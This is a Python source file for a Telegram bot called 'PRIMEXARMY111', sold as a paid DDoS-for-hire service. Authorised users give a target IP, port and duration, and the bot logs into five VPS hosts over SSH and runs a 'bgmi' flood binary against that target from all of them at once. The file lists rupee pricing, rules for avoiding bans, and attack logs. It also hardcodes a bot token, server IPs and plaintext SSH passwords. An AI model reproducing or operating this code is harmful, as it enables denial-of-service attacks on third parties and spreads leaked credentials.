#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PRIMEXARMY111 - Multi-VPS BGMI Attack Bot
"""

import telebot
import subprocess
import datetime
import os
import threading
import time
import paramiko
import random

# Insert your Telegram bot token here
bot = telebot.TeleBot('8064557178:AAG2U-RQ9gOmAE3eddfXEPuyLXiD6rnmlWk')

# Admin user IDs
admin_id = {"7129010361"}

# File to store allowed user IDs
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# ==================== VPS CONFIGURATION ====================
# Yahan apni 5 VPS ki details daalein
VPS_LIST = [
    {   # VPS 1
        "name": "VPS 1",
        "host": "18.138.247.49",  # Apna IP daalein
        "username": "master_vwecrmdnbf",  # Apna username daalein
        "password": "3RaWqtzheF4V",  # Apna password daalein
        "port": 22,
        "status": "offline",
        "bgmi_path": "/root/bgmi"  # BGMI binary ka path
    },
    {   # VPS 2
        "name": "VPS 2",
        "host": "140.82.41.118",  # Apna IP daalein
        "username": "master_rrvkmtuxam",  # Apna username daalein
        "password": "nJhkgYT3USj6",  # Apna password daalein
        "port": 22,
        "status": "offline",
        "bgmi_path": "/root/bgmi"  # BGMI binary ka path
    },
    {   # VPS 3
        "name": "VPS 3",
        "host": "139.84.171.32",  # Apna IP daalein
        "username": "master_arusjjvmjc",  # Apna username daalein
        "password": "Nmyv9ByMMxej",  # Apna password daalein
        "port": 22,
        "status": "offline",
        "bgmi_path": "/root/bgmi"  # BGMI binary ka path
    },
    {   # VPS 4
        "name": "VPS 4",
        "host": "44.194.61.20",  # Apna IP daalein
        "username": "master_ppbgppzykk",  # Apna username daalein
        "password": "pC24SvGCjfrC",  # Apna password daalein
        "port": 22,
        "status": "offline",
        "bgmi_path": "/root/bgmi"  # BGMI binary ka path
    },
    {   # VPS 5
        "name": "VPS 5",
        "host": "149.28.148.41",  # Apna IP daalein
        "username": "master_nwnynettbz",  # Apna username daalein
        "password": "XUcrAxYWzGu8",  # Apna password daalein
        "port": 22,
        "status": "offline",
        "bgmi_path": "/root/bgmi"  # BGMI binary ka path
    }
]

def read_users():
    """Read authorized users from file"""
    try:
        with open(USER_FILE, "r") as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        return []

# Initialize allowed users
allowed_user_ids = read_users()

def save_users():
    """Save authorized users to file"""
    with open(USER_FILE, "w") as file:
        for user_id in allowed_user_ids:
            file.write(f"{user_id}\n")

def log_command(user_id, target, port, attack_time, vps_name):
    """Log command to file"""
    try:
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
        
        with open(LOG_FILE, "a") as file:
            file.write(f"Time: {datetime.datetime.now()}\nUsername: {username}\nTarget: {target}\nPort: {port}\nDuration: {attack_time}s\nVPS: {vps_name}\n\n")
    except Exception as e:
        print(f"Error logging command: {e}")

def clear_logs():
    """Clear log file"""
    try:
        with open(LOG_FILE, "w") as file:
            file.write("")
        return "Logs cleared successfully ✅"
    except Exception as e:
        return f"Error clearing logs: {e}"

def test_vps_connection(vps):
    """Test connection to a VPS"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['host'], vps['port'], vps['username'], vps['password'], timeout=10)
        
        # Check if bgmi binary exists
        stdin, stdout, stderr = ssh.exec_command(f"test -f {vps['bgmi_path']} && echo 'exists' || echo 'not found'")
        bgmi_exists = stdout.read().decode().strip()
        
        ssh.close()
        
        if bgmi_exists == "exists":
            vps['status'] = "online"
            return True, "Online with BGMI"
        else:
            vps['status'] = "no_bgmi"
            return False, "Online but BGMI not found"
            
    except Exception as e:
        vps['status'] = "offline"
        return False, f"Offline: {str(e)}"

def run_bgmi_on_vps(vps, target, port, attack_time, threads=800):
    """Run bgmi attack on a specific VPS"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['host'], vps['port'], vps['username'], vps['password'], timeout=30)
        
        # Run the attack command
        command = f"{vps['bgmi_path']} {target} {port} {attack_time} {threads}"
        stdin, stdout, stderr = ssh.exec_command(command, timeout=attack_time + 10)
        
        # Wait for command to complete
        exit_status = stdout.channel.recv_exit_status()
        
        ssh.close()
        
        return exit_status == 0, stdout.read().decode(), stderr.read().decode()
        
    except Exception as e:
        return False, "", str(e)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
COOLDOWN_TIME = 300  # 5 minutes in seconds

@bot.message_handler(commands=['add'])
def add_user(message):
    """Add a user to authorized list"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    command = message.text.split()
    if len(command) < 2:
        bot.reply_to(message, "Please specify a user ID to add 😒.")
        return
        
    user_to_add = command[1]
    if user_to_add in allowed_user_ids:
        bot.reply_to(message, "User already exists 🤦‍♂️.")
    else:
        allowed_user_ids.append(user_to_add)
        save_users()
        bot.reply_to(message, f"User {user_to_add} Added Successfully 👍.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Remove a user from authorized list"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    command = message.text.split()
    if len(command) < 2:
        bot.reply_to(message, "Please specify a user ID to remove.")
        return
        
    user_to_remove = command[1]
    if user_to_remove in allowed_user_ids:
        allowed_user_ids.remove(user_to_remove)
        save_users()
        bot.reply_to(message, f"User {user_to_remove} removed successfully 👍.")
    else:
        bot.reply_to(message, f"User {user_to_remove} not found in the list.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    """Clear logs command"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    result = clear_logs()
    bot.reply_to(message, result)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    """Show all authorized users"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    if not allowed_user_ids:
        bot.reply_to(message, "No authorized users found.")
        return
        
    response = "Authorized Users:\n"
    for user_id in allowed_user_ids:
        try:
            user_info = bot.get_chat(int(user_id))
            username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
            response += f"- {username}\n"
        except:
            response += f"- User ID: {user_id}\n"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['vpsstatus'])
def show_vps_status(message):
    """Show status of all VPS"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    response = "🖥️ VPS Status:\n\n"
    for vps in VPS_LIST:
        status, message = test_vps_connection(vps)
        status_icon = "✅" if status else "❌"
        response += f"{status_icon} {vps['name']}: {vps['status']}\n"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    """Send log file"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file, caption="Attack Logs")
        except Exception as e:
            bot.reply_to(message, f"Error sending logs: {e}")
    else:
        bot.reply_to(message, "No logs found.")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    """Show user ID"""
    user_id = str(message.chat.id)
    bot.reply_to(message, f"🤖 Your ID: {user_id}")

def start_attack_reply(message, target, port, attack_time, vps_count):
    """Send attack started message"""
    user_info = message.from_user
    username = f"@{user_info.username}" if user_info.username else user_info.first_name
    
    response = f"""🚀 {username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃! 🔥🔥

𝐓𝐚𝐫𝐠𝐞𝐭: {target}
𝐏𝐨𝐫𝐭: {port}
𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {attack_time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
𝐕𝐏𝐒 𝐂𝐨𝐮𝐧𝐭: {vps_count}
𝐌𝐞𝐭𝐡𝐨𝐝: BGMI

Attack running on {vps_count} servers simultaneously!"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    """Handle bgmi attack command"""
    user_id = str(message.chat.id)
    
    # Check authorization
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    # Check cooldown for non-admin users
    if user_id not in admin_id:
        current_time = datetime.datetime.now()
        if user_id in bgmi_cooldown:
            time_diff = (current_time - bgmi_cooldown[user_id]).total_seconds()
            if time_diff < COOLDOWN_TIME:
                remaining = int(COOLDOWN_TIME - time_diff)
                bot.reply_to(message, f"⏳ You are on cooldown. Please wait {remaining} seconds.")
                return
        
        bgmi_cooldown[user_id] = current_time
    
    # Parse command
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
        return
    
    try:
        target = command[1]
        port = int(command[2])
        attack_time = int(command[3])
        
        # Validate input
        if attack_time > 240:
            bot.reply_to(message, "Maximum attack time is 240 seconds!")
            return
        
        if port < 1 or port > 65535:
            bot.reply_to(message, "Invalid port number! Use between 1-65535.")
            return
        
        # Find online VPS
        online_vps = []
        for vps in VPS_LIST:
            status, message = test_vps_connection(vps)
            if status:
                online_vps.append(vps)
        
        if not online_vps:
            bot.reply_to(message, "❌ No VPS available. All servers are offline.")
            return
        
        # Send attack started message
        start_attack_reply(message, target, port, attack_time, len(online_vps))
        
        # Run attack on all online VPS
        def attack_thread(vps):
            success, stdout, stderr = run_bgmi_on_vps(vps, target, port, attack_time)
            log_command(user_id, target, port, attack_time, vps['name'])
            
            # Log results
            status = "✅ Success" if success else "❌ Failed"
            print(f"{vps['name']}: {status}")
        
        # Start attack threads
        threads = []
        for vps in online_vps:
            thread = threading.Thread(target=attack_thread, args=(vps,))
            threads.append(thread)
            thread.start()
        
        # Wait for all attacks to complete
        for thread in threads:
            thread.join()
        
        # Send completion message
        completion_msg = f"✅ Attack completed on {len(online_vps)} VPS!\nTarget: {target}\nPort: {port}\nDuration: {attack_time}s"
        bot.send_message(message.chat.id, completion_msg)
        
    except ValueError:
        bot.reply_to(message, "Invalid parameters! Port and time must be numbers.")
    except Exception as e:
        bot.reply_to(message, f"Error starting attack: {e}")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    """Show user's command logs"""
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    if not os.path.exists(LOG_FILE):
        bot.reply_to(message, "No logs found.")
        return
    
    try:
        with open(LOG_FILE, "r") as file:
            logs = file.read()
        
        # Filter logs for this user
        user_logs = []
        current_log = []
        in_user_log = False
        
        for line in logs.split('\n'):
            if line.startswith('Time:'):
                if in_user_log and current_log:
                    user_logs.extend(current_log)
                current_log = [line]
                in_user_log = False
            elif line.startswith('Username:') and f"UserID: {user_id}" in line:
                in_user_log = True
                current_log.append(line)
            elif in_user_log and line.strip():
                current_log.append(line)
            elif line.strip() == '' and in_user_log:
                current_log.append(line)
        
        if in_user_log and current_log:
            user_logs.extend(current_log)
        
        if user_logs:
            # Split into chunks if too long
            log_text = '\n'.join(user_logs)
            if len(log_text) > 4000:
                for i in range(0, len(log_text), 4000):
                    bot.send_message(message.chat.id, log_text[i:i+4000])
            else:
                bot.reply_to(message, "Your recent attacks:\n" + log_text)
        else:
            bot.reply_to(message, "No attack logs found for you.")
            
    except Exception as e:
        bot.reply_to(message, f"Error reading logs: {e}")

@bot.message_handler(commands=['help', 'start'])
def show_help(message):
    """Show help message"""
    help_text = """🤖 PRIMEXARMY111 - Multi-VPS BGMI Attack Bot

💥 /bgmi <target> <port> <time> - Attack on all 5 VPS
💥 /rules - Rules to follow
💥 /mylogs - Check your recent attacks
💥 /plan - Check pricing plans
💥 /id - Get your user ID

Admin commands: /admincmd
"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['rules'])
def show_rules(message):
    """Show rules"""
    rules_text = """⚠️ PRIMEXARMY111 RULES:

1. Don't run too many attacks to avoid ban
2. Don't run multiple attacks simultaneously
3. Maximum attack time: 240 seconds
4. Follow cooldown periods
5. Logs are monitored regularly"""
    bot.reply_to(message, rules_text)

@bot.message_handler(commands=['plan'])
def show_plan(message):
    """Show pricing plans"""
    plan_text = """💰 PRIMEXARMY111 PRICING PLANS:

VIP 🌟 (Multi-VPS Power):
- Attack Time: 240 seconds
- Cooldown: 5 minutes
- Concurrent Attacks: 1
- 5 VPS Simultaneous Attack

PRICES:
- Day: 100 Rs
- Week: 600 Rs
- Month: 1200 Rs

Contact: @PRIME_X_ARMY"""
    bot.reply_to(message, plan_text)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    """Show admin commands"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    admin_text = """🛠️ PRIMEXARMY111 ADMIN COMMANDS:

/add <userid> - Add a user
/remove <userid> - Remove a user
/allusers - List authorized users
/vpsstatus - Check VPS status
/logs - View attack logs
/clearlogs - Clear logs
/broadcast <message> - Broadcast message"""
    bot.reply_to(message, admin_text)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """Broadcast message to all users"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return
        
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Please provide a message to broadcast.")
        return
        
    message_to_broadcast = "📢 Message from PRIMEXARMY111 Admin:\n\n" + parts[1]
    success_count = 0
    fail_count = 0
    
    for user_id in allowed_user_ids:
        try:
            bot.send_message(user_id, message_to_broadcast)
            success_count += 1
        except Exception as e:
            print(f"Failed to send to {user_id}: {e}")
            fail_count += 1
    
    bot.reply_to(message, f"Broadcast completed: {success_count} successful, {fail_count} failed.")

def main():
    """Main function"""
    print("PRIMEXARMY111 - Multi-VPS BGMI Attack Bot")
    print("Starting...")
    print("Testing VPS connections...")
    
    # Test all VPS connections
    for vps in VPS_LIST:
        status, message = test_vps_connection(vps)
        print(f"{vps['name']}: {vps['status']}")
    
    # Start bot
    print("PRIMEXARMY111 Bot is now running...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()